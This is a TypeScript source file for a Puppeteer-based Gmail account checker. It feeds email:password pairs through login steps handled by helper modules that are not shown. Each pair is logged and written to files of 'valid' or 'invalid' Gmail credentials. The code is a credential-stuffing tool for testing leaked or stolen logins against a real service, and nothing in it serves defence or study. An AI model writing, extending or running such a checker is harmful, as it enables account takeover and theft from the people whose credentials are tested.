// Import puppeteer
import { appendFile, promises } from 'fs';
import puppeteer, { ElementHandle, Page } from 'puppeteer';
import { emailFunc } from './components/emailFunc';
import { passFunc } from './components/passFunc';
export const checker = async (page: Page, email: string, pass: string) => {
  try {
    const emailRes = await emailFunc(page, email, pass);
    if (emailRes.err) {
      await promises.writeFile(
        './out/invalid_gmails.txt',
        `${email}:${pass}:${emailRes.err}\n`
      );
      console.log('bad email: ', `${email}:${pass}`);
      await page.close();
      return;
    }
    console.log('passed email check: ', `${email}:${pass}`);
    await page.waitFor(2000);
    const passwordRes = await passFunc(page, email, pass);
    if (passwordRes.err) {
      console.log('passwordRes: ', passwordRes, ` ${email}:${pass}`);
      await promises.writeFile(
        './out/invalid_gmails.txt',
        `${email}:${pass}:${passwordRes.err}\n`
      );
      await page.close();
      return;
    }
    await promises.writeFile('./out/valid_gmails.txt', `${email}:${pass}\n`);
    console.log('valid account: ', `${email}:${pass}`);

    await page.waitForNavigation({ waitUntil: 'networkidle0' });

    await page.close();
  } catch (err) {
    console.error('checker error: ', err);
    await page.close();
  }
};
